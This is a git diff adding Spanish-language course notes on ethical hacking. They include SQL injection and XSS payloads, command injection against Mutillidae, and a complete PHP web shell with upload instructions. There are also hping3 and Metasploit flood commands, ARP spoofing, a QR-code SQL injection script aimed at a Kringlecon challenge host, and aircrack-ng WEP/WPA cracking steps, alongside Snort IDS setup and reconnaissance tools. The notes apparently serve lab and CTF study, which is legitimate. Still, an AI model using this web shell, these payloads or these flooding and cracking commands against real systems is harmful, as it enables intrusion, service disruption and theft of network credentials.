@@ -1,0 +1,362 @@
+##################################################################
+##################################################################
+		Injection
+##################################################################
+##################################################################
+
+"' or 1=1 --
+
+<script>alert(document.cookie);</script>
+
+|| ls/var/www/html/mutillidae //muestra la carpeta mutillidae
+
+|| ifconfig //direccion ip del servidor
+
+
+WEB SHELL
+<form action=""method="POST"enctype="application/x-www-form-urlencoded">
+    <table style="margin-left: auto; margin-right: auto">
+        <tr>
+            <td colspan="2" style="text-align: center; font-weight: bold; color: #770000;">
+                Inserta el comando requerido
+            </td>
+        </tr>
+        <tr><td>&nbsp;</td></tr>
+        <tr>
+            <td style="font-weight: bold;">Comando</td>
+            <td><input type="text"name="pCommand"size=""></td>
+        </tr>
+        <tr><td>&nbsp;</td></tr>
+        <tr>
+            <td colspan="2"style="text-align: center;">
+                <input type="submit"value="Ejecutar Comando">
+            </td>
+        </tr>
+    </table>
+</form>
+<?php
+    if (isset($_REQUEST["pCommand"])) {
+        echo"<pre>";
+        echo shell_exec($_REQUEST["pCommand"]);
+        echo"</pre>";
+    }
+?>
+
+Guardar como name.php
+despues subir como un archivo a la pagina
+Ver en que ruta lo guardo la pagina
+Ir a esa ruta modificando la Url y uniendo la ruta donde se guardo
+Ejecutar comandos mostrados arriba
+
+
+
+
+##################################################################
+##################################################################
+		Obteniendo informacion
+##################################################################
+##################################################################
+
+ https://wifibit.com/google-hacking/
+    intitle:titulo, buscamos las páginas con un titulo indicado.
+    inurl:url, buscar el contenido en una url
+    intext:texto, buscar un texto en los titulos
+    site:sitio buscar lo relacionado con un sitio en particular.
+    filetype:tipoarchivo, para buscar un tipo de archivo.
+    Mas... https://docs.google.com/spreadsheets/d/1z35EOUfd0kuoKWOZRL80s5_tsMxNATY7/edit#gid=1341529455
+
+Framework que busca nombres de personas, dominios, etc...
+https://osintframework.com/
+
+
+
+##################################################################
+##################################################################
+		NIKTO && SPIDERFOOT
+##################################################################
+##################################################################
+
+nikto -h http://url -o html
+
+
+Instalar SpiderFoot
+
+pip install lxml netaddr M2Crypto cherrypy mako requests bs4
+apt-get install python-m2crypto
+cd lugar_donde_esta_doc
+tar zxvf spider_asdfasdfas.tar
+
+#ejecutar
+python ./sf.py
+ingresar a 127.0.0.1:5001/newscan
+	scan name=prueba
+	seed target=url de pagina
+https://github.com/smicallef/spiderfoot?ref=d
+info: https://www.spiderfoot.net/spiderfoot-3-0-is-now-included-in-kali-linux/
+
+
+################################################################
+Otra pagina para realizar pruebas
+https://www.vulnhub.com/
+
+
+
+################################################################
+################################################################
+		Pentesting
+################################################################
+################################################################
+
+Diferentes tipos de pentesting:
+
+    Seguridad en la Red: Cómo se encuentra, interna, externa o inalámbrica
+    Aplicación: Puedes evaluar diferentes módulos de cómo transmiten mensajes
+    Seguridad física: Cómo es la seguridad de acceso al data center, tiene cámaras de seguridad? cuenta con respuesta a incidentes?
+    Ingeniería Social: Evaluar el phishing. quiénes son vulnerables a este tipo de ataques, quiénes pueden suplantar identidad
+
+Tipos de pentesting
+
+    Black-box: Podemos simular un ataque como lo hacen los profesionales en el mundo real. No conoce nada más que el nombre de la empresa
+    White-box: El personal te dará acceso a toda la información necesaria como la red que se utiliza, la infraestructura y más.
+    Grey-box: Es una mezcla entre las dos anteriores.
+
+Formas de realizar un pentesting
+
+    Pruebas anunciadas: Se cuenta con la total cooperación y conocimiento personal de TI.
+    Pruebas no anunciada: Son un intento de comprometer el sistema en la red del cliente sin el conocimiento del personal de seguridad de TI
+
+Fases de un pentesting
+
+    Pre-ataque: Realizarás la planeación y preparación del ataque.
+    Ataque: Adquirimos un objetivo a través de una vulnerabilidad
+    Post-ataque: Entregamos un reporte técnico y no técnico.
+
+
+
+################################################################
+################################################################
+		TruffleHog
+################################################################
+################################################################
+
+En esta practica se uso para acceder a un repositorio de git
+y encontrar contraseñas en archivos que no son permitidos
+si necesitan de un password
+
+Practica: https://docs.google.com/document/d/1YmGDeQTbdDVRO_m67MorCcGjmKr9CLM7LPsMas1iFx0/edit
+
+pip install truffleHog
+sudo pip3 install truffleHog
+
+*****Para probar TruffleHug se agrega se utiliza:
+truffleHog https://github.com/dxa4481/truffleHog.git
+*****Se puede ejecutar sin entropía y que utilice expresiones regulares con:
+truffleHog --regex --entropy=False https://github.com/dxa4481/truffleHog.git
+
+
+################################################################
+################################################################
+		Sniff
+################################################################
+################################################################
+
+sudo apt install dsniff
+sudo arpspoof -i eth0 -t 192.168.0.13 -r 192.168.0.1
+
+-i = Interfaz Eth de salida
+-t = IP Target
+-r = Router/Gateway
+
+################################################################
+################################################################
+		DOSs
+################################################################
+################################################################
+
+Denegación de Servicio es un ataque tiene como objetivo principal que un recurso sea accedido de forma correcta por los usuarios, tratar de consumir los recursos de CPU o memoria para no mostrar el servicio o con lentitud.
+
+    LOIC es una herramienta que se encarga de hacer ataques al protocolo TCP, UDP o HTTP ( 
+    https://sourceforge.net/projects/highorbitioncannon/files/latest/download 
+    https://downloads.sourceforge.net/project/loic/loic/loic-1.0.8/LOIC-1.0.8-binary.zip?r=https%3A%2F%2Fsourceforge.net%2Fprojects%2Floic%2Freviews&ts=1590013207&use_mirror=gigenet)
+    HOIC se encarga de realizar ataques solo al protocolo HTTP
+    
+    
+    También se puede hacer un --spoof IP y usar el --faster.
+    	hping3 192.168.10.104 sólo envia paquetes en blanco sin ninguna bandera y recibe la bandera ACK
+	hping3 192.168.10.104 -T verifica los saltos en red
+	hping3 192.168.10.104 -p 80 -food hacer saturación en el puerto 80 con flood utilizando los recursos de la tarjeta de red (saturación para sobre cargar paquetes TCP de envió y respuesta)
+	hping3 --flood -udp -p 80 192.168.10.104 saturación de paquetes mediante UDP (El servidor no responde)
+	hping3 -S 192.168.10.104 --flood -p 80 se envian paquetes se SYN y se reciben paquetes de Solicitud y Confirmación (uso excesivo de recursos) -S es para sincronización de TCP
+La estrategia para prevenir un ataque DoS es bloquear la IP cuando esta enviando demasiadas solicitudes
+	hping3 -S 192.168.10.104 --flood -p 80 --rand-source envia solicitudes con direcciones de origen aleatorias.
+	
+	Mitigacion:
+	https://es.slideshare.net/dfpluc/mitigacion-de-ataques-ddos
+
+
+Smurf
+El ataque pitufo o ataque smurf es un ataque de denegación de servicio que utiliza mensajes de ping al broadcast con spoofing para inundar (flood) un objetivo (sistema atacado).
+
+	hping3 --icmp -spoof 192.168.10.104 255.255.255.255 Ataque dirigido al broadcast, todas las maquinas disponibles en la red responderán a la solicitud
+	
+	DoS con Metasploit
+	(Ataque de SYN con IP´s aleatorias)
+	Msfconsole
+
+	use auxiliary/dos/tcp/synflood
+
+	show options
+
+	set RHOST 192.168.10.104
+
+	run
+
+
+################################################################
+################################################################
+		Bypass autenticación QR
+################################################################
+################################################################
+
+Te genera el QR https://www.the-qrcode-generator.com/
+Intalacion del interprete de QR: 
+	pip install qrcode (https://pypi.org/project/qrcode/
+	pip install requests
+
+****************
+		programa.py
+****************
+
+import io
+import qrcode
+import requests
+
+# Crear código QR y guardarlo en un archivo en bytes .png
+datos = "juan' or enabled=1 #"
+archivo = io.BytesIO()
+QR = qrcode.make(datos)
+QR.save(archivo, format="png")
+
+# Petición HTTPS con requests
+imagen = {'barcode': ('QR.png', archivo.getvalue(), 'image/png')}
+cookie = {'resource_id': 'b1c268e6-7d70-452a-961e-ad73e0d3fed4'}
+respuesta = requests.post('https://scanomatic.kringlecastle.com/upload', files=imagen, cookies=cookie)
+# Respuesta https
+print(respuesta.text)
+
+****************
+		Insertar en el resultado
+****************
+where authorized = 1 AND uid = 'juan' or enabled=1 #
+
+
+################################################################
+################################################################
+		Detecciones de acceso
+################################################################
+################################################################
+
+IDS es un programa que permite detectar accesos no autorizados a un equipo informático a una red.
+
+Tipos de IDS
+
+    Sistemas de detección de intrusos basados en equipo(HIDS): Cuando se ve afectado por un malware tiene un comportamiento atípico.
+    Sistemas de detección de intrusos basados en red(NIDS): Nos permite detectar patrones inusuales en la red
+    
+
+************Snort
+
+Es necesario instalar las librerias requeridas por Snort con el comando.sudo apt install -y gcc libpcre3-dev zlib1g-dev libluajit-5.1-dev libpcap-dev openssllibssl-dev libnghttp2-dev libdumbnet-dev bison flex libdnet
+
+sudo apt-get install snort
+
+Seleccionar la interfaz enp0s3
+
+El intervalo de direcciones para la red local es 192.168.2.0/24
+
+Seleccionar la interfaz enp0s3
+
+snort -v
+
+Ingresar a la carpeta /etc/snort y editar el archivo snort.conf.
+	sudo nano /etc/snort/snort.conf
+	ipvar HOME_NET 192.168.2.0/24
+	ipvar EXTERNAL_NET any
+	GUARDAR
+
+Se valida la configuración con el comando.
+Snort -T -i enp0s3 -c /etc/snort/snort.conf
+
+Para ingresar una regla personalizada editar el archivo local. rules en la carpeta /etc/snort/rules
+	sudo nano /etc/snort/rules/local.rules
+	Agregar una regla que detecte el protocolo ICMP
+	alert icmp any any -> $HOME_NET any (msg:"ICMP DETECTADO"; sid:1000001;rev:1;)
+	GUARDAR
+
+INICIAR
+sudo snort -A console -q -c /etc/snort/snort.conf -i enp0s3
+
+entrar a snort
+	usuario:snort
+	pswd:nada
+	
+	ifconfig
+	
+	
+################################################################
+################################################################
+	PASSWORD en redes inalambricas
+################################################################
+################################################################
+
+suite aircrack-ng
+
+*************WEP
+
+airmon-ng check kill — mata los procesos de red del sistema
+airmon-ng start wlan0 — pone la targeta en modo monitoreo
+airodump-ng wlan0mmon — captura informacion
+airodump-ng wlan0mon -w captura1 — pasa todo lo que captura a un archivo
+
+
+airodump-ng --bssid macaddress -c canal -w archivo wlan0mon -Solo trabaja con este tipo de canal
+aireplay-ng --help
+aireplay-ng -9 -a macaddress wlan0mon -probar si se puede hacer la injectionS
+aireplay-ng -0 0 -a macaddress -c macaddress_a_bloquear wlan0mon -manda paquetes para impedir el acceso
+
+
+*************Ataque a WPA
+
+airmon-ng check kill – mata los procesos que se tengan abiertos.
+airmon-ng start wlan0 – inicia el modo promiscuo en la tarjeta de red
+airodump-ng wlan0mon --inicia el monitoreo de las redes
+airodump-ng --bssid macadresssaccespoint -c 1 wlan0mon -w capturaWPA
+aireplay-ng --deauth 5 -a macaddressaccespoint wlan0mon
+aircrack-ng capturaWPA-01.cap -w rockyou.txt
+
+ https://www.youtube.com/watch?v=dnn5dnD5YRE&t=4535s
+
+################################################################
+################################################################
+		Certificaciones
+################################################################
+################################################################
+
+CDN=>CEH=>ECSA=>LPT
+
+https://aws.amazon.com/certification/
+https://www.eccouncil.org/programs/certified-ethical-hacker-ceh-es/
+https://www.offensive-security.com/courses-and-certifications/
+https://www.cisco.com/c/en/us/training-events/training-certifications/certifications/associate/ccna-routing-switching.html
+https://www.comptia.org/es/capacitacion/por-certificacion/linux
+
+
+Vulnerabilidades
+https://www.incibe-cert.es/alerta-temprana/vulnerabilidades
+
+
+
+
+
+
+
